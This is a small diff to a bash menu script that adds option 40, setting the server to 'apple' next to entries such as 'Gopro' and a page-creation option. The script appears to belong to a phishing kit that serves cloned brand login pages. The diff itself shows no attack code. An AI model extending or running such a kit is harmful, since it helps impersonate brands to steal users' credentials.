@@ -216,6 +216,10 @@ elif [[ $option == 39 ]]; then
 server="Gopro"
 start
 
+elif [[ $option == 40 ]]; then
+server="apple"
+start
+
 elif [[ $option == 99 ]]; then
 server="create"
 createpage
